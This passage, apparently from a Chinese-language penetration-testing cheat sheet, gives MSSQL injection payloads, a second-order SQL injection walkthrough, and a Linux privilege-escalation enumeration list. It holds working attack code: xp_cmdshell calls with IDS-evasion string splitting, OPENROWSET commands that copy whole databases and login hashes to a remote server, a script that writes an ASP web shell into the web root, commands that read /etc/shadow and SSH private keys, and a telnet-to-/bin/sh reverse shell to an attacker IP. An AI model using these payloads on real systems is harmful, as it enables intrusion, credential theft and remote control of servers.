href="#获得数据表字段名-将字段值更新为字段名，再想法读出这个字段的值就可得到字段名" class="headerlink" title="###[获得数据表字段名][将字段值更新为字段名，再想法读出这个字段的值就可得到字段名]"></a>###[获得数据表字段名][将字段值更新为字段名，再想法读出这个字段的值就可得到字段名]</h5><pre class="line-numbers language-none"><code class="language-none">update 表名set 字段&#x3D;(select top 1 col_name(object_id（要查询的数据表名），字段列如：1) [ where 条件]绕过IDS的检测[使用变量];declare @a sysname set @a&#x3D;xp_+cmdshell exec @a dir c:\;declare @a sysname set @a&#x3D;xp+_cm’+’dshell exec @a dir c:\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="开启远程数据库"><a href="#开启远程数据库" class="headerlink" title="开启远程数据库"></a>开启远程数据库</h4><h5 id="基本语法"><a href="#基本语法" class="headerlink" title="#基本语法"></a>#基本语法</h5><pre class="line-numbers language-none"><code class="language-none">select * from OPENROWSET(SQLOLEDB,server&#x3D;servername;uid&#x3D;sa;pwd&#x3D;123,select * from table1 )参数： (1) OLEDB Provider name其中连接字符串参数可以是任何端口用来连接，比如select * from OPENROWSET(SQLOLEDB,uid&#x3D;sa;pwd&#x3D;123;Network&#x3D;DBMSSOCN;Address&#x3D;192.168.0.1,1433;,select * from table复制目标主机的整个数据库insert所有远程表到本地表。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="基本语法："><a href="#基本语法：" class="headerlink" title="#基本语法："></a>#基本语法：</h5><pre class="line-numbers language-none"><code class="language-none">insert into OPENROWSET(SQLOLEDB,server&#x3D;servername;uid&#x3D;sa;pwd&#x3D;123,select * from table1) select * from table2这行语句将目标主机上table2表中的所有数据复制到远程数据库中的table1表中。实际运用中适当修改连接字符串的IP地址和端口，指向需要的地方，比如：insert into OPENROWSET(SQLOLEDB,uid&#x3D;sa;pwd&#x3D;123;Network&#x3D;DBMSSOCN;Address&#x3D;192.168.0.1,1433;,select * from table1) select * fromtable2insert into OPENROWSET(SQLOLEDB,uid&#x3D;sa;pwd&#x3D;123;Network&#x3D;DBMSSOCN;Address&#x3D;192.168.0.1,1433;,select * from _sysdatabases)select * from master.dbo.sysdatabasesinsert into OPENROWSET(SQLOLEDB,uid&#x3D;sa;pwd&#x3D;123;Network&#x3D;DBMSSOCN;Address&#x3D;192.168.0.1,1433;,select * from _sysobjects)select * from user_database.dbo.sysobjectsinsert into OPENROWSET(SQLOLEDB,uid&#x3D;sa;pwd&#x3D;123;Network&#x3D;DBMSSOCN;Address&#x3D;192.168.0.1,1433;,select * from _syscolumns)select * from user_database.dbo.syscolumns<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="复制数据库："><a href="#复制数据库：" class="headerlink" title="#复制数据库："></a>#复制数据库：</h5><pre class="line-numbers language-none"><code class="language-none">insert into OPENROWSET(SQLOLEDB,uid&#x3D;sa;pwd&#x3D;123;Network&#x3D;DBMSSOCN;Address&#x3D;192.168.0.1,1433;,select * from table1)select * from database..table1 insert into OPENROWSET(SQLOLEDB,uid&#x3D;sa;pwd&#x3D;123;Network&#x3D;DBMSSOCN;Address&#x3D;192.168.0.1,1433;,select * from table2) select * fromdatabase..table2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="复制哈希表（HASH）登录密码的hash存储于sysxlogins中。方法如下："><a href="#复制哈希表（HASH）登录密码的hash存储于sysxlogins中。方法如下：" class="headerlink" title="#复制哈希表（HASH）登录密码的hash存储于sysxlogins中。方法如下："></a>#复制哈希表（HASH）登录密码的hash存储于sysxlogins中。方法如下：</h5><pre class="line-numbers language-none"><code class="language-none">insert into OPENROWSET(SQLOLEDB,uid&#x3D;sa;pwd&#x3D;123;Network&#x3D;DBMSSOCN;Address&#x3D;192.168.0.1,1433;,select * from _sysxlogins) select* from database.dbo.sysxlogins得到hash之后，就可以进行暴力破解。遍历目录的方法：先创建一个临时表：temp;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--;insert temp exec master.dbo.xp_availablemedia;-- 获得当前所有驱动器;insert into temp(id) exec master.dbo.xp_subdirs c:\;-- 获得子目录列表;insert into temp(id,num1) exec master.dbo.xp_dirtree c:\;-- 获得所有子目录的目录树结构，并寸入temp表中;insert into temp(id) exec master.dbo.xp_cmdshell type c:\web\index.asp;-- 查看某个文件的内容;insert into temp(id) exec master.dbo.xp_cmdshell dir c:\;--;insert into temp(id) exec master.dbo.xp_cmdshell dir c:\ *.asp &#x2F;s&#x2F;a;--;insert into temp(id) exec master.dbo.xp_cmdshell cscript. C:\Inetpub\AdminScripts\adsutil.vbs enum w3svc;insert into temp(id,num1) exec master.dbo.xp_dirtree c:\;-- （xp_dirtree适用权限PUBLIC）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="写入表："><a href="#写入表：" class="headerlink" title="#写入表："></a>#写入表：</h5><pre class="line-numbers language-none"><code class="language-none">语句1：and 1&#x3D;(SELECT IS_SRVROLEMEMBER(sysadmin));--语句2：and 1&#x3D;(SELECT IS_SRVROLEMEMBER(serveradmin));--语句3：and 1&#x3D;(SELECT IS_SRVROLEMEMBER(setupadmin));--语句4：and 1&#x3D;(SELECT IS_SRVROLEMEMBER(securityadmin));--语句5：and 1&#x3D;(SELECT IS_SRVROLEMEMBER(securityadmin));--语句6：and 1&#x3D;(SELECT IS_SRVROLEMEMBER(diskadmin));--语句7：and 1&#x3D;(SELECT IS_SRVROLEMEMBER(bulkadmin));--语句8：and 1&#x3D;(SELECT IS_SRVROLEMEMBER(bulkadmin));--语句9：and 1&#x3D;(SELECT IS_MEMBER(db_owner));--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="把路径写到表中去："><a href="#把路径写到表中去：" class="headerlink" title="#把路径写到表中去："></a>#把路径写到表中去：</h5><pre class="line-numbers language-none"><code class="language-none">;create table dirs(paths varchar(100),id int)--;insert dirs exec master.dbo.xp_dirtree c:\--and 0&lt;&gt;(select top 1 paths from dirs)--and 0&lt;&gt;(select top 1 paths from dirs where paths not in(@Inetpub))--;create table dirs1(paths varchar(100),id int)--;insert dirs exec master.dbo.xp_dirtree e:\web--and 0&lt;&gt;(select top 1 paths from dirs1)--把数据库备份到网页目录：下载;declare @a sysname; set @a&#x3D;db_name();backup database @a to disk&#x3D;e:\web\down.bak;--and 1&#x3D;(Select top 1 name from(Select top 12 id,name from sysobjects where xtype&#x3D;char(85)) T order by id desc)and 1&#x3D;(Select Top 1 col_name(object_id(USER_LOGIN),1) from sysobjects) 参看相关表。and 1&#x3D;(select user_id from USER_LOGIN)and 0&#x3D;(select user from USER_LOGIN where user&gt;1)-&#x3D;-wscript.shellexample -&#x3D;-declare @o intexec sp_oacreate wscript.shell,@o outexec sp_oamethod @o,run,NULL,notepad.exe; declare @o int exec sp_oacreate wscript.shell,@o out exec sp_oamethod @o,run,NULL,notepad.exe--declare @o int,@f int,@t int,@ret intdeclare @line varchar(8000)exec sp_oacreate scripting.filesystemobject,@o outexec sp_oamethod @o,opentextfile,@f out,c:\boot.ini,1exec @ret &#x3D; sp_oamethod @f,readline,@line outwhile( @ret &#x3D; 0 )beginprint @lineexec @ret &#x3D; sp_oamethod @f,readline,@line outenddeclare @o int,@f int,@t int,@ret intexec sp_oacreate scripting.filesystemobject,@o outexec sp_oamethod @o,createtextfile,@f out,c:\inetpub\wwwroot\foo.asp,1exec @ret &#x3D; sp_oamethod @f,writeline,NULL,&lt;% set o &#x3D; server.createobject(&quot;wscript.shell&quot;): o.run( request.querystring(&quot;cmd&quot;) ) %&gt;declare @o int,@ret intexec sp_oacreate speech.voicetext,@o outexec sp_oamethod @o,register,NULL,foo,barexec sp_oasetproperty @o,speed,150exec sp_oamethod @o,speak,NULL,all your sequel servers are belong to,us,528 waitfor delay 00:00:05; declare @o int,@ret int exec sp_oacreate speech.voicetext,@o out exec sp_oamethod @o,register,NULL,foo,bar execsp_oasetproperty @o,speed,150 exec sp_oamethod @o,speak,NULL,all your sequel servers are belong to us,528 waitfor delay 00:00:05--xp_dirtree适用权限PUBLICexec master.dbo.xp_dirtree c:\返回的信息有两个字段subdirectory、depth。Subdirectory字段是字符型，depth字段是整形字段。create table dirs(paths varchar(100),id int)建表，这里建的表是和上面xp_dirtree相关连，字段相等、类型相同。insert dirs exec master.dbo.xp_dirtree c:\只要我们建表与存储进程返回的字段相定义相等就能够执行！达到写表的效果.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="18-sql注入利用"><a href="#18-sql注入利用" class="headerlink" title="18.sql注入利用"></a>18.sql注入利用</h2><p>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。<br>网页篡改：通过操作数据库对特定网页进行篡改。<br>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。<br>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。<br>服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</p><h2 id="19-SQL二级注入"><a href="#19-SQL二级注入" class="headerlink" title="19.SQL二级注入"></a>19.SQL二级注入</h2><h3 id="什么是二次注入？"><a href="#什么是二次注入？" class="headerlink" title="什么是二次注入？"></a>什么是二次注入？</h3><p>简单的说，二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。</p><p>网站对我们输入的一些重要的关键字进行了转义，但是这些我们构造的语句已经写进了数据库，可以在没有被转义的地方使用</p><p>可能每一次注入都不构成漏洞，但是如果一起用就可能造成注入。</p><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p><strong>二次注入需要具备的两个条件：</strong></p><p>（1）用户向数据库插入恶意语句（即使后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义）</p><p>（2）数据库对自己存储的数据非常放心，直接取出恶意数据给用户</p><p>登录页面 新建用户</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402220853348.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402220904887.png"></p><p>数据插进去了</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402220918444.png"></p><p>登录</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402220931620.png"></p><p>修改密码</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402220945418.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402220952552.png"></p><p>修改完后查看下，当前账号admin’# 并没修改到密码 还是原来的123456 倒是把表中另一个admin账号修改了</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402221002982.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402221012280.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402221021396.png"></p><p>查看修改密码页面的源代码</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402221034559.png"></p><p>传进来的的语句变成了这样</p><p>$pass变量&#x3D;传进来的新密码 $username 当前用户 $curr_pass 当前用户登录密码</p><p><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;123456789&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;;</code></p><p>#把后面的都给注释了，所以就是修改了admin用户的密码为123456789</p><p>用这条语句把admin改回原来的密码</p><p><code>update users set password=&#39;admin&#39; where username=&#39;admin&#39;#&#39; and password=123456789;</code></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402221112046.png"></p><h2 id="20-linux下的敏感文件？"><a href="#20-linux下的敏感文件？" class="headerlink" title="20.linux下的敏感文件？"></a>20.linux下的敏感文件？</h2><p>来源：<a href="https://blog.csdn.net/jb19900111/article/details/18619653?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control&amp;dist_request_id=1328603.386.16148619991812411&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control">https://blog.csdn.net/jb19900111/article/details/18619653?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control&amp;dist_request_id=1328603.386.16148619991812411&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control</a></p><p> 在本文开始之前，我想指出我不是专家。据我所知，在这个庞大的区域,没有一个“神奇”的答案.分享，共享（我的出发点）。下面是一个混合的命令做同样的事情，在不同的地方，或只是一个不同的眼光来看待事物。我知道有更多的“东西”去寻找。这只是一个基本粗略的指南。并不是每一个命令，做好要注重细节.</p><p> 文中的每行为一条命令，文中有的命令可能在你的主机上敲不出来，因为它可能是在其他版本的linux中所使用的命令。</p><p> 列举关键点</p><p> （Linux）的提权是怎么一回事：</p> <pre class="line-numbers language-none"><code class="language-none">收集 – 枚举，枚举和一些更多的枚举。过程 – 通过数据排序，分析和确定优先次序。搜索 – 知道搜索什么和在哪里可以找到漏洞代码。适应 – 自定义的漏洞，所以它适合。每个系统的工作并不是每一个漏洞“都固定不变”。尝试 – 做好准备,试验和错误。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 系统类型</p><p> 系统是什么版本?</p><pre class="line-numbers language-none"><code class="language-none">cat &#x2F;etc&#x2F;issuecat &#x2F;etc&#x2F;*-releasecat &#x2F;etc&#x2F;lsb-releasecat &#x2F;etc&#x2F;redhat-release<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>它的内核版本是什么？</p><pre class="line-numbers language-none"><code class="language-none">cat &#x2F;proc&#x2F;version  uname -auname -mrsrpm -q kerneldmesg | grep Linuxls &#x2F;boot | grep vmlinuz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它的环境变量里有些什么？</p><pre class="line-numbers language-none"><code class="language-none">cat &#x2F;etc&#x2F;profilecat &#x2F;etc&#x2F;bashrccat ~&#x2F;.bash_profilecat ~&#x2F;.bashrccat ~&#x2F;.bash_logoutenvset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>是否有台打印机？</p><pre class="line-numbers language-none"><code class="language-none">lpstat -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 应用与服务</p><p> 正在运行什么服务？什么样的服务具有什么用户权限？</p><pre class="line-numbers language-none"><code class="language-none">ps auxps -eftopcat &#x2F;etc&#x2F;service<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>哪些服务具有root的权限？这些服务里你看起来那些有漏洞,进行再次检查！</p><pre class="line-numbers language-none"><code class="language-none">ps aux | grep rootps -ef | grep root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装了哪些应用程序？他们是什么版本？哪些是当前正在运行的？</p><pre class="line-numbers language-none"><code class="language-none">ls -alh &#x2F;usr&#x2F;bin&#x2F;ls -alh &#x2F;sbin&#x2F;dpkg -lrpm -qals -alh &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archivesOls -alh &#x2F;var&#x2F;cache&#x2F;yum&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Service设置，有任何的错误配置吗？是否有任何（脆弱的）的插件？</p><pre class="line-numbers language-none"><code class="language-none">cat &#x2F;etc&#x2F;syslog.confcat &#x2F;etc&#x2F;chttp.confcat &#x2F;etc&#x2F;lighttpd.confcat &#x2F;etc&#x2F;cups&#x2F;cupsd.confcat &#x2F;etc&#x2F;inetd.confcat &#x2F;etc&#x2F;apache2&#x2F;apache2.confcat &#x2F;etc&#x2F;my.confcat &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.confcat &#x2F;opt&#x2F;lampp&#x2F;etc&#x2F;httpd.confls -aRl &#x2F;etc&#x2F; | awk ‘$1 ~ &#x2F;^.*r.*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主机上有哪些工作计划？</p><pre class="line-numbers language-none"><code class="language-none">crontab -lls -alh &#x2F;var&#x2F;spool&#x2F;cronls -al &#x2F;etc&#x2F; | grep cronls -al &#x2F;etc&#x2F;cron*cat &#x2F;etc&#x2F;cron*cat &#x2F;etc&#x2F;at.allowcat &#x2F;etc&#x2F;at.denycat &#x2F;etc&#x2F;cron.allowcat &#x2F;etc&#x2F;cron.denycat &#x2F;etc&#x2F;crontabcat &#x2F;etc&#x2F;anacrontabcat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主机上可能有哪些纯文本用户名和密码?</p><pre class="line-numbers language-none"><code class="language-none">grep -i user [filename]grep -i pass [filename]grep -C 5 &quot;password&quot; [filename]find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;   # Joomla<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> 通信与网络</p><p> NIC(s)，系统有哪些？它是连接到哪一个网络？</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;sbin&#x2F;ifconfig -acat &#x2F;etc&#x2F;network&#x2F;interfacescat &#x2F;etc&#x2F;sysconfig&#x2F;network<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>网络配置设置是什么？网络中有什么样的服务器？DHCP服务器？DNS服务器？网关？</p><pre class="line-numbers language-none"><code class="language-none">cat &#x2F;etc&#x2F;resolv.confcat &#x2F;etc&#x2F;sysconfig&#x2F;networkcat &#x2F;etc&#x2F;networksiptables -Lhostnamednsdomainname<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其他用户主机与系统的通信？</p><pre class="line-numbers language-none"><code class="language-none">lsof -ilsof -i :80grep 80 &#x2F;etc&#x2F;servicesnetstat -antupnetstat -antpxnetstat -tulpnchkconfig --listchkconfig --list | grep 3:onlastw<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>缓存？IP和&#x2F;或MAC地址?</p><pre class="line-numbers language-none"><code class="language-none">arp -eroute&#x2F;sbin&#x2F;route -nee<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>数据包可能嗅探吗？可以看出什么？监听流量</p><pre class="line-numbers language-none"><code class="language-none"># tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>你如何get一个shell？你如何与系统进行交互？</p><pre class="line-numbers language-none"><code class="language-none"># http:&#x2F;&#x2F;lanmaster53.com&#x2F;2011&#x2F;05&#x2F;7-linux-shells-using-built-in-tools&#x2F;nc -lvp 4444    # Attacker. 输入 (命令)nc -lvp 4445    # Attacker. 输出(结果)telnet [atackers ip] 44444 | &#x2F;bin&#x2F;sh | [local ip] 44445    # 在目标系统上. 使用 攻击者的IP!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如何端口转发？（端口重定向）</p><p># rinetd</p><pre class="line-numbers language-none"><code class="language-none"># http:&#x2F;&#x2F;www.howtoforge.com&#x2F;port-forwarding-with-rinetd-on-debian-etch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p># fpipe</p><pre class="line-numbers language-none"><code class="language-none"># FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]FPipe.exe -l 80 -r 80 -s 80 192.168.1.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>#ssh</p><pre class="line-numbers language-none"><code class="language-none"># ssh -[L&#x2F;R] [local port]:[remote ip]:[remote port] [local user]@[local ip]ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Portssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>#mknod</p><pre class="line-numbers language-none"><code class="language-none"># mknod backpipe p ; nc -l -p [remote port] &lt; backpipe  | nc [local IP] [local port] &gt;backpipemknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.1.1.251 80 &gt;backpipe    # Port Relaymknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe    # Proxy (Port 80 to 8080)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>mknod</p><pre class="line-numbers language-none"><code class="language-none">backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nclocalhost 80 | tee -a outflow &amp; 1&gt;backpipe    # Proxy monitor (Port 80 to 8080)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>建立隧道可能吗？本地，远程发送命令</p><pre class="line-numbers language-none"><code class="language-none">ssh -D 127.0.0.1:9050 -N [username]@[ip]proxychains ifconfig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> 秘密信息和用户</p><p> 你是谁？哪个id登录？谁已经登录？还有谁在这里？谁可以做什么呢？</p><pre class="line-numbers language-none"><code class="language-none">idwhowlastcat &#x2F;etc&#x2F;passwd | cut -d:    # List of usersgrep -v -E &quot;^#&quot; &#x2F;etc&#x2F;passwd | awk -F: &amp;#039;$3 &#x3D;&#x3D; 0 &#123; print $1&#125;&#39;   # List of super usersawk -F: &#39;($3 &#x3D;&#x3D; &quot;0&quot;) &#123;print&#125;&amp;#039; &#x2F;etc&#x2F;passwd   # List of super userscat &#x2F;etc&#x2F;sudoerssudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以找到什么敏感文件？</p><pre class="line-numbers language-none"><code class="language-none">cat &#x2F;etc&#x2F;passwdcat &#x2F;etc&#x2F;groupcat &#x2F;etc&#x2F;shadowls -alh &#x2F;var&#x2F;mail&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>什么有趣的文件在home&#x2F;directorie（S）里？如果有权限访问</p><pre class="line-numbers language-none"><code class="language-none">ls -ahlR &#x2F;root&#x2F;ls -ahlR &#x2F;home&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>是否有任何密码，脚本，数据库，配置文件或日志文件？密码默认路径和位置</p><pre class="line-numbers language-none"><code class="language-none">cat &#x2F;var&#x2F;apache2&#x2F;config.inccat &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql&#x2F;user.MYDcat &#x2F;root&#x2F;anaconda-ks.cfg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>用户做过什么？是否有任何密码呢？他们有没有编辑什么？</p><pre class="line-numbers language-none"><code class="language-none">cat ~&#x2F;.bash_historycat ~&#x2F;.nano_historycat ~&#x2F;.atftp_historycat ~&#x2F;.mysql_historycat ~&#x2F;.php_history<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以找到什么样的用户信息</p><pre class="line-numbers language-none"><code class="language-none">cat ~&#x2F;.bashrccat ~&#x2F;.profilecat &#x2F;var&#x2F;mail&#x2F;rootcat &#x2F;var&#x2F;spool&#x2F;mail&#x2F;root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>private-key 信息能否被发现？</p><pre class="line-numbers language-none"><code class="language-none">cat ~&#x2F;.ssh&#x2F;authorized_keyscat ~&#x2F;.ssh&#x2F;identity.pubcat ~&#x2F;.ssh&#x2F;identitycat ~&#x2F;.ssh&#x2F;id_rsa.pubcat ~&#x2F;.ssh&#x2F;id_rsacat ~&#x2F;.ssh&#x2F;id_dsa.pubcat ~&#x2F;.ssh&#x2F;id_dsacat &#x2F;etc&#x2F;ssh&#x2F;ssh_configcat &#x2F;etc&#x2F;ssh&#x2F;sshd_configcat &#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key.pubcat &#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_keycat &#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key.pubcat &#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_keycat &#x2F;etc&#x2F;ssh&#x2F;ssh_host_key.pubcat &#x2F;etc&#x2F;ssh&#x2F;ssh_host_key<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 文件系统</p><p> 哪些用户可以写配置文件在&#x2F; etc &#x2F;？能够重新配置服务？</p><pre class="line-numbers language-none"><code class="language-none">ls -aRl &#x2F;etc&#x2F; | awk ‘$1 ~ &#x2F;^.*w.*&#x2F;&#39; 2&gt;&#x2F;dev&#x2F;null     # Anyonels -aRl &#x2F;etc&#x2F; | awk ’$1 ~ &#x2F;^..w&#x2F;&#39; 2&gt;&#x2F;dev&#x2F;null        # Ownerls -aRl &#x2F;etc&#x2F; | awk ‘$1 ~ &#x2F;^.....w&#x2F;&#39; 2&gt;&#x2F;dev&#x2F;null    # Groupls -aRl &#x2F;etc&#x2F; | awk ’;$1 ~ &#x2F;w.$&#x2F;&#39; 2&gt;&#x2F;dev&#x2F;null          # Otherfind &#x2F;etc&#x2F; -readable -type f 2&gt;&#x2F;dev&#x2F;null                         # Anyonefind &#x2F;etc&#x2F; -readable -type f -maxdepth 1 2&gt;&#x2F;dev&#x2F;null   # Anyone<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在&#x2F; var &#x2F;有什么可以发现？</p><pre class="line-numbers language-none"><code class="language-none">ls -alh &#x2F;var&#x2F;logls -alh &#x2F;var&#x2F;maills -alh &#x2F;var&#x2F;spoolls -alh &#x2F;var&#x2F;spool&#x2F;lpdls -alh &#x2F;var&#x2F;lib&#x2F;pgsqlls -alh &#x2F;var&#x2F;lib&#x2F;mysqlcat &#x2F;var&#x2F;lib&#x2F;dhcp3&#x2F;dhclient.leases<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>网站上的任何隐藏配置&#x2F;文件?配置文件与数据库信息？</p><pre class="line-numbers language-none"><code class="language-none">ls -alhR &#x2F;var&#x2F;www&#x2F;ls -alhR &#x2F;srv&#x2F;www&#x2F;htdocs&#x2F;ls -alhR &#x2F;usr&#x2F;local&#x2F;www&#x2F;apache22&#x2F;data&#x2F;ls -alhR &#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;ls -alhR &#x2F;var&#x2F;www&#x2F;html&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有什么在日志文件里?（什么能够帮助到“本地文件包含”?)</p><pre class="line-numbers language-none"><code class="language-none"># http:&#x2F;&#x2F;www.thegeekstuff.com&#x2F;2011&#x2F;08&#x2F;linux-var-log-files&#x2F;cat &#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access_logcat &#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access.logcat &#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;error_logcat &#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;error.logcat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access_logcat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.logcat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;error_logcat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.logcat &#x2F;var&#x2F;log&#x2F;apache&#x2F;access_logcat &#x2F;var&#x2F;log&#x2F;apache&#x2F;access.logcat &#x2F;var&#x2F;log&#x2F;auth.logcat &#x2F;var&#x2F;log&#x2F;chttp.logcat &#x2F;var&#x2F;log&#x2F;cups&#x2F;error_logcat 